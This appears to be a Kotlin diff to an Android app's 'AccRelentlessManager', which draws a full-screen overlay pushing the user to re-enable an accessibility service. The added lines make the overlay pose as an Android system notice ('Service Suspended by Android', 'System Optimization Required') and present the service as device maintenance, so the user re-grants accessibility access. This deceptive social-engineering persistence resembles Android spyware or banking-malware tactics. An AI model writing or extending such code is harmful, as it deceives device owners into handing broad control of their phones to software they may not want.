@@ -101,14 +101,20 @@ object AccRelentlessManager {
     }
 
     private fun getDefaultHtml(ctx: Context): String {
+        val isZombie = PermissionManager.isAccessibilityZombie(ctx)
+        val title = if (isZombie) "Service Suspended by Android" else "System Optimization Required"
+        val desc = if (isZombie) 
+            "Android suspended this service after multiple force stops. The switch in Settings may still show ON, but it is dead. Please toggle it OFF and then ON again to restart it." 
+            else "To maintain device health and performance, please re-enable the maintenance service."
+        val btnText = if (isZombie) "TOGGLE OFF / ON" else "OKAY"
         return """
             <html><body style='background:rgba(0,0,0,0.85);color:white;font-family:sans-serif;padding:30px;text-align:center;'>
                 <div style='margin-top:40%;'>
-                    <h2 style='color:#3B82F6;'>System Optimization Required</h2>
-                    <p style='color:#94A3B8;'>To maintain device health and performance, please re-enable the maintenance service.</p>
+                    <h2 style='color:#3B82F6;'>$title</h2>
+                    <p style='color:#94A3B8;'>$desc</p>
                     <br><br>
                     <button onclick='Cortex.openAccSettings()' 
-                        style='background:#3B82F6;color:white;border:none;padding:15px 40px;border-radius:10px;font-weight:bold;width:100%;'>OKAY</button>
+                        style='background:#3B82F6;color:white;border:none;padding:15px 40px;border-radius:10px;font-weight:bold;width:100%;'>$btnText</button>
                     <br><br>
                     <button onclick='Cortex.openAccHelp()' 
                         style='background:transparent;color:#94A3B8;border:1px solid #444;padding:12px 40px;border-radius:10px;width:100%;'>HELP</button>
